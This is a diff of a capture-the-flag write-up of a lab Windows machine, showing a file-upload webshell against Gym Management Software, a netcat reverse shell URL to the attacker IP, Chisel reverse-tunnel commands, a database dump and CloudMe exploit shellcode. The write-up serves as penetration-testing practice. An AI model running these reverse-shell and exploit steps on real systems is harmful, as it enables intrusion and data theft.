@@ -22,9 +22,19 @@ There is no simple and easy way to edit text files from a command line in PowerS
 
 * `(Get-Content $input_txt ).Replace('$this','$that') | Out-File $output_txt`
 
-#### Useful thing 2
+### Create a port-forwarding reverse tunnel with Chisel
 
-* description with generic example
+First create your Chisel server on your attacking machine.  The option `-p $port` opens a listener on the port specified.
+
+```text
+chisel server -p 8099 --reverse 
+```
+
+Then, on the victim machine you need to create a client, specifying which local port you would like to connect to through your reverse tunnel.
+
+```text
+./chi.exe client 10.10.15.82:8099 R:8888:127.0.0.1:8888
+```
 
 ## Enumeration
 
@@ -63,21 +73,24 @@ Some kind of fitness site
 
 ![](../../.gitbook/assets/2-about.png)
 
-mrbe3n's Bro Hut - on about page
+"mrbe3n's Bro Hut" - on about page
 
 ![](../../.gitbook/assets/3-undefined-index.png)
 
-I found an `upload.php` page, but it gave an error message.
+I found an `upload.php` page, but it gave an error message.  I wasn't sure what `xampp` was, so I looked it up.
 
 * [https://www.apachefriends.org/index.html](https://www.apachefriends.org/index.html)
 
 > XAMPP is a completely free, easy to install Apache distribution containing MariaDB, PHP, and Perl. The XAMPP open source package has been set up to be incredibly easy to install and to use.
 
+###  Exploiting Gym Management Software 1.0
+
 ![](../../.gitbook/assets/4-gym-management.png)
 
- Gym Management Software 1.0 - contact page
+Gym Management Software 1.0 - contact page
 
-[https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/](https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/) [https://www.exploit-db.com/exploits/48506](https://www.exploit-db.com/exploits/48506)
+* [https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/](https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/)
+* [https://www.exploit-db.com/exploits/48506](https://www.exploit-db.com/exploits/48506)
 
 > Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution \(RCE\) on the Hosting Webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters. Exploit Details:
 >
@@ -123,10 +136,10 @@ The exploit instructions looked more complicated than they actually were.
 Exiting.
 ```
 
-The exploit completed successfully and created a webshell.  Next, I had to connect to it by connecting to the file `kamehameha.php` with my command set as the parameter for the variable `telepathy`.  
+The exploit completed successfully created a webshell.  Next, I had to connect to it by connecting to the file `kamehameha.php` with my command set as the parameter for the variable `telepathy`.  
 
 {% hint style="info" %}
-You can use **`curl`**, **`burp`**, or your browser to do this.  I think I used the browser this time and just copied the text to my notes.
+You can use **`curl`**, **`burp`**, or your web browser to do this.  From what I understand, the PoC is supposed to create a sort of pseudo-shell, but I couldn't get that to work no matter what I tried.
 {% endhint %}
 
 ```text
@@ -141,10 +154,10 @@ Saw `plink.exe` in the directory and didn't recognize the program, so I looked i
 
 * [https://www.ssh.com/ssh/putty/putty-manuals/0.68/Chapter7.html](https://www.ssh.com/ssh/putty/putty-manuals/0.68/Chapter7.html)
 
-> Plink is a command-line connection tool similar to UNIX ssh. It is mostly used for automated operations, such as making CVS access a repository on a remote server. Plink is probably not what you want if you want to run an interactive session in a console window
+> Plink is a command-line connection tool similar to UNIX ssh. It is mostly used for automated operations, such as making CVS access a repository on a remote server. Plink is probably not what you want if you want to run an interactive session in a console window.
 
 {% hint style="info" %}
-I am pretty sure another player uploaded that there at some point, though at the time I had no idea what it was, or what it was used for.  It is a older and perhaps more common version of **`socat`** that is packaged with Putty.
+I am pretty sure another player uploaded plink there at some point, though at the time I had no idea what it was, or what it was used for.  It is an older and perhaps more common version of **`chisel`** that is packaged with Putty.
 {% endhint %}
 
 ```text
@@ -163,8 +176,6 @@ DNT: 1
 This time I used Burp to send the command to download `nc.exe` to the remote machine from mine using `curl`. 
 
 ## Initial Foothold
-
-
 
 ```text
 http://10.10.10.198:8080//upload/kamehameha.php?telepathy=nc.exe%20-e%20powershell.exe%2010.10.15.82%2012346
@@ -436,16 +447,20 @@ cat xampp-control.log
 ...snipped...
 ```
 
-I found out that `xampp` required administrative rights, and was version 7.4.6. The control panel was version 3.2.4 and compiled on Jun 5th 2019.  I did some research to see if there were any vulnerabilities in this version that I could take advantage of since this seemed pretty old at this point.
+From the file `xampp-control.log` I found out that `xampp` required administrative rights, and was version 7.4.6. The control panel was version 3.2.4 and compiled on Jun 5th 2019.  I did some research to see if there were any vulnerabilities in this version that I could take advantage of since this seemed pretty old at this point.
 
 * [https://www.apachefriends.org/blog/new\_xampp\_20200519.html](https://www.apachefriends.org/blog/new_xampp_20200519.html)
 * [https://meterpreter.org/xampp/](https://meterpreter.org/xampp/)
 
 > XAMPP \(stands for Cross-Platform \(X\), Apache \(A\), MariaDB \(M\), PHP \(P\) and Perl \(P\)\) is very easy to install Apache Distribution for Linux, Solaris, Windows, and Mac OS X. The package includes the Apache web server, MySQL, PHP, Perl, an FTP server and phpMyAdmin. It is a simple, lightweight Apache distribution that makes it extremely easy for developers to create a local web server for testing and deployment purposes. Everything needed to set up a web server – server application \(Apache\), database \(MariaDB\), and scripting language \(PHP\) – is included in an extractable file. It is also cross-platform, which means it works equally well on Linux, Mac, and Windows. Since most actual web server deployments use the same components as XAMPP, it makes transitioning from a local test server to a live server.
 
+#### Random notes?
+
 * [https://social.technet.microsoft.com/Forums/en-US/cfa65a6f-3f8c-42ca-9978-bdbffdc99ec5/how-do-i-edit-a-text-file-in-powershell](https://social.technet.microsoft.com/Forums/en-US/cfa65a6f-3f8c-42ca-9978-bdbffdc99ec5/how-do-i-edit-a-text-file-in-powershell)
 
 > `(Get-Content .\input.txt ).Replace('text','fun') | Out-File .\output.txt`
+
+_Not sure why this is here...useful, but I think I was chasing another rabbit_  🐇🐇
 
 ```text
 PS C:\xampp> cat passwords.txt
@@ -513,7 +528,7 @@ pause
 
 In the same folder was a file called `myslq_start.bat`, which started `mysqld` using the configuration file `mysql\bin\my.ini`.  
 
-[https://dev.mysql.com/doc/refman/5.7/en/mysqldump-sql-format.html](https://dev.mysql.com/doc/refman/5.7/en/mysqldump-sql-format.html)
+* [https://dev.mysql.com/doc/refman/5.7/en/mysqldump-sql-format.html](https://dev.mysql.com/doc/refman/5.7/en/mysqldump-sql-format.html)
 
 ```text
 PS C:\xampp\mysql\bin> ./mysqldump.exe --all-databases -u root > ~/Downloads/dmp.txt      
@@ -547,7 +562,7 @@ d-----       16/06/2020     16:31                share
 -a----       10/12/2019     13:47          86263 THIRDPARTY
 ```
 
-found an interesting batch script in the mysql folder
+I found an interesting batch script in the `mysql` folder.
 
 ```text
 PS C:\xampp\mysql> cat resetroot.bat
@@ -575,7 +590,7 @@ PS C:\xampp\mysql\bin> ./mysql.exe -u root
 ./mysql.exe -u root
 ```
 
-After resetting the root password for `mysql`, I logged in and checkout out what I could find.  There was...nothing.
+After resetting the root password for `mysql`, I logged in and checked out what I could find.  There was...nothing.
 
 ```text
 New XAMPP release 7.2.31 , 7.3.18 , 7.4.6
@@ -617,7 +632,7 @@ Mode                LastWriteTime         Length Name
 -a----       16/06/2020     16:26       17830824 CloudMe_1112.exe
 ```
 
-Found `Cloudme_1112.exe` in the `/Downloads` folder
+Found `Cloudme_1112.exe` in the `C:\Users\shaun\Downloads` folder
 
 ```text
 PS C:\Program Files (x86)> ps
@@ -632,7 +647,7 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
     270      17     2964       2416       0.88   7528   0 CloudMe_1112
 ```
 
-ps
+ps showed multiple versions of `CloudMe` running.  
 
 ```text
 ┌──(zweilos㉿kali)-[~]
@@ -654,7 +669,7 @@ CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)            | windows_
 Shellcodes: No Results
 ```
 
-I had to test multiple of the exploits before I found one that actually worked. I'm certain that it was more the fact that this was an easy box that was being hammered by many many people. Even after choosing the right exploit I had to reset the machine to get it to run. had to recompile some of the shellcode in the exploit with the provided msfvenom command
+I had to test multiple of the exploits before I found one that actually worked. I'm certain that it was more the fact that this was an easy box that was being hammered by many many people. Even after choosing the right exploit I had to reset the machine to get it to run. I also had to recompile some of the shellcode in the exploit with the provided `msfvenom` command. 
 
 ```text
 ┌──(zweilos㉿kali)-[~]
@@ -689,14 +704,20 @@ unsigned char buf[] =
 "\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
 ```
 
-two options for creating a tunnel in order to run the local exploit against the remote machine. plink?
+I found two options for creating a tunnel in order to run the local exploit against the remote machine. 
 
-```text
-https://www.ssh.com/ssh/putty/putty-manuals/0.68/Chapter7.html
-https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
-```
+plink?
 
-or chisel? [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) [https://www.puckiestyle.nl/pivot-with-chisel/](https://www.puckiestyle.nl/pivot-with-chisel/) [https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
+* [https://www.ssh.com/ssh/putty/putty-manuals/0.68/Chapter7.html](https://www.ssh.com/ssh/putty/putty-manuals/0.68/Chapter7.html)
+* [https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)
+
+or chisel? 
+
+* [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) 
+* [https://www.puckiestyle.nl/pivot-with-chisel/](https://www.puckiestyle.nl/pivot-with-chisel/) 
+* [https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
+
+Chisel looked like an overall better tool, and one that I wanted to add to my toolkit.
 
 ```text
 PS C:\Users\shaun\Downloads> ./chi.exe client 10.10.15.82:8099 R:8888:127.0.0.1:8888
@@ -706,9 +727,9 @@ PS C:\Users\shaun\Downloads> ./chi.exe client 10.10.15.82:8099 R:8888:127.0.0.1:
 2020/08/23 23:43:13 client: Connected (Latency 53.5461ms)
 ```
 
-[http://10.10.10.198:8080/upload/kamehameha.php?telepathy=nc.exe -e powershell.exe 10.10.14.220 12346](http://10.10.10.198:8080/upload/kamehameha.php?telepathy=nc.exe%20-e%20powershell.exe%2010.10.14.220%2012346)
+http://10.10.10.198:8080/upload/kamehameha.php?telepathy=nc.exe -e powershell.exe 10.10.14.220 12346
 
-Had to manuallly upload both nc.exe and chisel.exe...used burp repeater
+Had to manually upload both nc.exe and chisel.exe...used burp repeater
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/buff]
@@ -797,7 +818,7 @@ SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for anot
 ERROR: Unable to get user claims information.
 ```
 
-and then I was logged in as Administrator, with full privileges.
+and then I was logged in as Administrator, with full privileges!
 
 ### Root.txt
 
